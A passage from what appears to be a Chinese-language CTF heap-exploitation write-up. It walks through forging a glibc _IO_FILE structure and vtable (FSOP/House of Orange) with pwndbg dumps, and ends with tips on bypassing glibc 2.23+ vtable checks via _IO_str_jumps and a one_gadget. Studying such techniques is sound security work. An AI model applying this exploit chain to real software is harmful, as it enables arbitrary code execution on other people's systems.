      _fileno = 0,
      _flags2 = 0,
      _old_offset = 0,
      _cur_column = 0,
      _vtable_offset = 0 '00',
      _shortbuf = "",
      _lock = 0x0,
      _offset = 0,
      __pad1 = 0x0,
      __pad2 = 0x0,
      __pad3 = 0x0,
      __pad4 = 0x0,
      __pad5 = 0,
      _mode = 0,
      _unused2 = '00' 
    }
然后修改fp->_IO_write_base
    $21 = {
      _flags = 1852400175,
      _IO_read_ptr = 0x61 ,
      _IO_read_end = 0x7ffff7dd1b78  "20@b",
      _IO_read_base = 0x7ffff7dd2510 "",
      _IO_write_base = 0x2 ,
      _IO_write_ptr = 0x0,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0,
      _flags2 = 0,
      _old_offset = 0,
      _cur_column = 0,
      _vtable_offset = 0 '00',
      _shortbuf = "",
      _lock = 0x0,
      _offset = 0,
      __pad1 = 0x0,
      __pad2 = 0x0,
      __pad3 = 0x0,
      __pad4 = 0x0,
      __pad5 = 0,
      _mode = 0,
      _unused2 = '00' 
    }
随后修改了_IO_write_ptr
    $22 = {
      _flags = 1852400175,
      _IO_read_ptr = 0x61 ,
      _IO_read_end = 0x7ffff7dd1b78  "20@b",
      _IO_read_base = 0x7ffff7dd2510 "",
      _IO_write_base = 0x2 ,
      _IO_write_ptr = 0x3 ,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0,
      _flags2 = 0,
      _old_offset = 0,
      _cur_column = 0,
      _vtable_offset = 0 '00',
      _shortbuf = "",
      _lock = 0x0,
      _offset = 0,
      __pad1 = 0x0,
      __pad2 = 0x0,
      __pad3 = 0x0,
      __pad4 = 0x0,
      __pad5 = 0,
      _mode = 0,
      _unused2 = '00' 
    }
现在就只需要控制我们的jump_table就好了
    pwndbg> x/10gx top+12
    0x602460:       0x0000000000000000      0x0000000000000000
    0x602470:       0x0000000000000000      0x000000000040078f
    0x602480:       0x0000000000000000      0x0000000000000000
    0x602490:       0x0000000000000000      0x0000000000000000
    0x6024a0:       0x0000000000000000      0x0000000000000000
先将我们的jump_table伪造成0x40078f,然后赋值给我们的jump_table
    $27 = {
      file = {
        _flags = 1852400175,
        _IO_read_ptr = 0x61 ,
        _IO_read_end = 0x7ffff7dd1b78  "20@b",
        _IO_read_base = 0x7ffff7dd2510 "",
        _IO_write_base = 0x2 ,
        _IO_write_ptr = 0x3 ,
        _IO_write_end = 0x0,
        _IO_buf_base = 0x0,
        _IO_buf_end = 0x0,
        _IO_save_base = 0x0,
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x0,
        _fileno = 0,
        _flags2 = 0,
        _old_offset = 4196239,
        _cur_column = 0,
        _vtable_offset = 0 '00',
        _shortbuf = "",
        _lock = 0x0,
        _offset = 0,
        _codecvt = 0x0,
        _wide_data = 0x0,
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        __pad5 = 0,
        _mode = 0,
        _unused2 = '00' 
      },
      vtable = 0x602460
    }
现在再调用malloc因为会检测size,由于 sizebk->fd指针指向了_io_list_ptr
为了绕过检测,我们首先要绕过两个检查
一个是_mode必须为0,另一个是_write_base2.23后虽然加了检测机制,但我们依旧可以通过改 vtable为
_IO_str_jump来绕过检测,将偏移0xe0处设置为one_gadget即可